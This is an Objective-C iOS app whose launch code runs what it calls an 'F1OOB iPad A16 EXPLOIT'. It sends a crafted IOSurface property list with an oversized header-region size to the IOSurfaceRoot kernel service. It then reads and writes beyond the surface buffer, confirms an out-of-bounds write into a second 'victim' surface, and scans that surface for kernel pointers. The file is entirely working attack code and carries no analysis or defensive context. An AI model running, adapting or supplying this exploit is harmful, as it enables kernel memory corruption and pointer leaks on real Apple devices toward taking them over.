#import <Foundation/Foundation.h>
#import <Metal/Metal.h>
#import <UIKit/UIKit.h>
#import <IOKit/IOKitLib.h>
#import <mach/mach.h>
#import <dlfcn.h>
#import <sys/utsname.h>

// MARK: - Scene Delegate

@interface SceneDelegate : UIResponder <UIWindowSceneDelegate>
@property (strong, nonatomic) UIWindow *window;
@property (strong, nonatomic) UITextView *logView;
- (void)log:(NSString *)msg;
@end

@implementation SceneDelegate

- (void)log:(NSString *)msg {
    NSString *line = [NSString stringWithFormat:@"%@\n", msg];
    NSLog(@"%@", line);
    dispatch_async(dispatch_get_main_queue(), ^{
        if (self.logView) {
            self.logView.text = [self.logView.text stringByAppendingString:line];
            NSRange range = NSMakeRange(self.logView.text.length - 1, 1);
            [self.logView scrollRangeToVisible:range];
        }
    });
}

- (void)scene:(UIScene *)scene willConnectToSession:(UISceneSession *)session options:(UISceneConnectionOptions *)connectionOptions {
    NSLog(@"=== SCENE DELEGATE CALLED ===");
    
    self.window = [[UIWindow alloc] initWithWindowScene:(UIWindowScene *)scene];
    self.window.backgroundColor = [UIColor blackColor];
    
    UIViewController *vc = [[UIViewController alloc] init];
    self.logView = [[UITextView alloc] initWithFrame:self.window.bounds];
    self.logView.editable = NO;
    self.logView.font = [UIFont monospacedSystemFontOfSize:11 weight:UIFontWeightRegular];
    self.logView.backgroundColor = [UIColor blackColor];
    self.logView.textColor = [UIColor greenColor];
    vc.view = self.logView;
    
    self.window.rootViewController = vc;
    [self.window makeKeyAndVisible];
    
    [self log:@"=== F1OOB iPad A16 EXPLOIT ==="];
    
    struct utsname uts;
    uname(&uts);
    [self log:[NSString stringWithFormat:@"Device: %s | iOS: %@", uts.machine, [[UIDevice currentDevice] systemVersion]]];
    
    // Run exploit SYNCHRONOUSLY on main thread
    [self log:@"About to run exploit..."];
    [self runExploit];
}

- (void)runExploit {
    [self log:@"runExploit ENTERED"];
    
    [self log:@"[1] Loading IOSurface..."];
    
    void *handle = dlopen("/System/Library/PrivateFrameworks/IOSurface.framework/IOSurface", RTLD_NOW);
    if (!handle) {
        [self log:[NSString stringWithFormat:@"FAIL: dlopen: %s", dlerror()]];
        return;
    }
    
    void *(*IOSurfaceCreate)(void *) = dlsym(handle, "IOSurfaceCreate");
    void *(*IOSurfaceLock)(uint32_t, uint32_t, uint32_t *) = dlsym(handle, "IOSurfaceLock");
    void *(*IOSurfaceUnlock)(uint32_t, uint32_t, uint32_t *) = dlsym(handle, "IOSurfaceUnlock");
    void *(*IOSurfaceGetBaseAddress)(uint32_t) = dlsym(handle, "IOSurfaceGetBaseAddress");
    size_t (*IOSurfaceGetAllocSize)(uint32_t) = dlsym(handle, "IOSurfaceGetAllocSize");
    
    if (!IOSurfaceCreate || !IOSurfaceGetBaseAddress) {
        [self log:@"FAIL: Missing IOSurface functions"];
        return;
    }
    [self log:@"PASS: IOSurface loaded"];
    
    [self log:@"[2] Opening IOSurfaceRoot..."];
    io_service_t root = IOServiceGetMatchingService(0, IOServiceMatching("IOSurfaceRoot"));
    if (!root) {
        [self log:@"FAIL: IOSurfaceRoot not found"];
        return;
    }
    
    io_connect_t conn = 0;
    kern_return_t kr = IOServiceOpen(root, mach_task_self(), 0, &conn);
    IOObjectRelease(root);
    if (kr != KERN_SUCCESS) {
        [self log:[NSString stringWithFormat:@"FAIL: IOServiceOpen: 0x%x", kr]];
        return;
    }
    [self log:@"PASS: IOSurfaceRoot opened"];
    
    [self log:@"[3] Creating F1 surface (4GB header wrap)..."];
    
    const char *f1_xml =
        "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
        "<plist version=\"1.0\"><dict>"
        "<key>IOSurfaceIsGlobal</key><true/>"
        "<key>IOSurfacePixelFormat</key><integer>1111970369</integer>"
        "<key>IOSurfaceWidth</key><integer>256</integer>"
        "<key>IOSurfaceHeight</key><integer>256</integer>"
        "<key>IOSurfaceBytesPerElement</key><integer>4</integer>"
        "<key>IOSurfaceBytesPerRow</key><integer>1024</integer>"
        "<key>IOSurfaceAllocSize</key><integer>65536</integer>"
        "<key>IOSurfacePlaneSize</key><integer>65536</integer>"
        "<key>IOSurfacePlaneCount</key><integer>1</integer>"
        "<key>IOSurfacePlaneDataRegionBytesPerSlice</key><integer>16384</integer>"
        "<key>IOSurfacePlaneHeaderRegionBytesPerSlice</key><integer>1073741824</integer>"
        "<key>IOSurfaceSliceCount</key><integer>4</integer>"
        "</dict></plist>";
    
    uint32_t f1_id = 0;
    kr = IOConnectCallMethod(conn, 0, NULL, 0, f1_xml, strlen(f1_xml)+1, NULL, NULL, &f1_id, NULL);
    if (kr != KERN_SUCCESS || !f1_id) {
        [self log:[NSString stringWithFormat:@"FAIL: F1 create: 0x%x", kr]];
        IOServiceClose(conn);
        return;
    }
    [self log:[NSString stringWithFormat:@"PASS: F1 surface ID = %u", f1_id]];
    
    [self log:@"[4] Creating victim surface..."];
    
    const char *vic_xml =
        "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
        "<plist version=\"1.0\"><dict>"
        "<key>IOSurfaceIsGlobal</key><true/>"
        "<key>IOSurfacePixelFormat</key><integer>1111970369</integer>"
        "<key>IOSurfaceWidth</key><integer>256</integer>"
        "<key>IOSurfaceHeight</key><integer>256</integer>"
        "<key>IOSurfaceBytesPerElement</key><integer>4</integer>"
        "<key>IOSurfaceBytesPerRow</key><integer>1024</integer>"
        "<key>IOSurfaceAllocSize</key><integer>65536</integer>"
        "</dict></plist>";
    
    uint32_t vic_id = 0;
    kr = IOConnectCallMethod(conn, 0, NULL, 0, vic_xml, strlen(vic_xml)+1, NULL, NULL, &vic_id, NULL);
    if (kr != KERN_SUCCESS || !vic_id) {
        [self log:[NSString stringWithFormat:@"FAIL: Victim create: 0x%x", kr]];
        IOServiceClose(conn);
        return;
    }
    [self log:[NSString stringWithFormat:@"PASS: Victim surface ID = %u", vic_id]];
    
    [self log:@"[5] Testing F1 OOB access..."];
    
    void *f1_base = IOSurfaceGetBaseAddress(f1_id);
    if (!f1_base) {
        [self log:@"FAIL: F1 base address is NULL"];
        IOServiceClose(conn);
        return;
    }
    [self log:[NSString stringWithFormat:@"F1 base: %p", f1_base]];
    
    uint32_t seed = 0;
    IOSurfaceLock(f1_id, 1, &seed);
    
    [self log:@"Reading beyond 64KB..."];
    uint64_t *ptr = (uint64_t *)f1_base;
    
    for (int i = 0x10000/8; i < 0x10000/8 + 0x100; i += 0x20) {
        uint64_t val = ptr[i];
        if (val != 0 && val != 0x4141414141414141) {
            [self log:[NSString stringWithFormat:@"OOB[0x%x] = 0x%llx", i*8, val]];
        }
    }
    
    [self log:@"Testing cross-surface write..."];
    
    void *vic_base = IOSurfaceGetBaseAddress(vic_id);
    if (vic_base) {
        [self log:[NSString stringWithFormat:@"Victim base: %p", vic_base]];
        
        *(uint32_t *)vic_base = 0x47474747;
        [self log:@"Wrote 0x47474747 to victim[0]"];
        
        for (int offset = 0x10000; offset < 0x100000; offset += 0x1000) {
            uint32_t *test = (uint32_t *)((uint8_t *)f1_base + offset);
            if (*test == 0x47474747) {
                [self log:[NSString stringWithFormat:@"*** FOUND VICTIM AT F1+0x%x ***", offset]];
                
                *test = 0x43434343;
                if (*(uint32_t *)vic_base == 0x43434343) {
                    [self log:@"*** CROSS-SURFACE OOB WRITE CONFIRMED ***"];
                    
                    [self log:@"Scanning for kernel pointers..."];
                    for (int j = 0; j < 0x1000/8; j++) {
                        uint64_t val = ((uint64_t *)vic_base)[j];
                        if ((val >> 40) == 0xffffff || (val >> 44) == 0xfffff) {
                            [self log:[NSString stringWithFormat:@"KERNEL PTR at victim[0x%x]: 0x%llx", j*8, val]];
                        }
                    }
                }
                break;
            }
        }
    }
    
    IOSurfaceUnlock(f1_id, 1, &seed);
    IOServiceClose(conn);
    
    [self log:@"=== EXPLOIT COMPLETE ==="];
}

@end

// MARK: - App Delegate

@interface AppDelegate : UIResponder <UIApplicationDelegate>
@end

@implementation AppDelegate

- (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions {
    NSLog(@"=== APP DELEGATE CALLED ===");
    return YES;
}

- (UISceneConfiguration *)application:(UIApplication *)application configurationForConnectingSceneSession:(UISceneSession *)connectingSceneSession options:(UISceneConnectionOptions *)options {
    NSLog(@"=== CONFIG FOR CONNECTING SCENE ===");
    UISceneConfiguration *config = [[UISceneConfiguration alloc] initWithName:@"Default Configuration" sessionRole:connectingSceneSession.role];
    config.delegateClass = [SceneDelegate class];
    return config;
}

@end

// MARK: - Main

int main(int argc, char *argv[]) {
    @autoreleasepool {
        NSLog(@"=== MAIN CALLED ===");
        return UIApplicationMain(argc, argv, nil, NSStringFromClass([AppDelegate class]));
    }
}
